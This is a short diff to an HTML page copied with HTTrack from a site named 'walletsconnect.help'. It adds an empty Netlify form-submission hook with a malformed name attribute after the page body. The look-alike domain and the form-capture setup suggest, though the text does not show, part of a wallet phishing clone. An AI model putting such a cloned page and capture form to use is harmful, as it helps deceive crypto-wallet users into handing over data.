@@ -379,6 +379,13 @@
         </footer>
     </center>
 </body>
+    <form
+  name="contact> netlify"
+  action="/pages/success"
+  method="POST"
+  data-netlify="true"
+></form>
+
 
 <!-- Mirrored from walletsconnect.help/ by HTTrack Website Copier/3.x [XR&CO'2014], Tue, 13 Apr 2021 04:06:12 GMT -->
 
